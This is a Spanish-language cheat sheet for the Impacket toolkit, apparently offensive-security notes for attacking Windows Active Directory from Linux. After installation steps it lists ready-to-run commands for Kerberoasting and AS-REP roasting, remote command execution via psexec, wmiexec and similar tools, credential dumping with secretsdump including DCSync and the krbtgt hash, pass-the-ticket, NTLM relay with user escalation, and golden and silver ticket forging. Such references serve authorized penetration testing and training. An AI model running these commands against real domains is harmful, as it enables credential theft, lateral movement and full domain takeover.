# Impacket

Suite de herramientas Python para protocolos de red de Windows. Esencial para ataques AD desde Linux.

#### Instalación

```bash
pip3 install impacket
# O desde repo para la versión más actualizada
git clone https://github.com/fortra/impacket.git
cd impacket && pip3 install .
```

#### Herramientas principales

```bash
# --- Autenticación y tickets ---
impacket-getTGT empresa.local/usuario:contraseña -dc-ip 10.10.10.10
impacket-getST -spn cifs/target empresa.local/usuario:contraseña -dc-ip 10.10.10.10

# --- Enumeración ---
impacket-GetADUsers -all empresa.local/usuario:contraseña -dc-ip 10.10.10.10
impacket-GetUserSPNs empresa.local/usuario:contraseña -dc-ip 10.10.10.10 -request
impacket-GetNPUsers empresa.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass
impacket-findDelegation empresa.local/usuario:contraseña -dc-ip 10.10.10.10

# --- Ejecución remota ---
impacket-psexec empresa.local/usuario:contraseña@10.10.10.10
impacket-wmiexec empresa.local/usuario:contraseña@10.10.10.10
impacket-smbexec empresa.local/usuario:contraseña@10.10.10.10
impacket-atexec empresa.local/usuario:contraseña@10.10.10.10 "whoami"
impacket-dcomexec empresa.local/usuario:contraseña@10.10.10.10

# --- Dump de credenciales ---
impacket-secretsdump empresa.local/usuario:contraseña@10.10.10.10
impacket-secretsdump empresa.local/usuario:contraseña@10.10.10.10 -just-dc   # DCSync
impacket-secretsdump empresa.local/usuario:contraseña@10.10.10.10 -just-dc-user krbtgt

# --- SMB ---
impacket-smbclient empresa.local/usuario:contraseña@10.10.10.10

# --- Tickets (Pass-the-Ticket) ---
export KRB5CCNAME=usuario.ccache
impacket-psexec -k -no-pass empresa.local/usuario@target.empresa.local

# --- Relay ---
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -t ldap://10.10.10.10 --escalate-user usuario_controlado

# --- Forjar tickets ---
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain empresa.local Administrator  # Golden
impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain empresa.local -spn cifs/target Administrator  # Silver
```
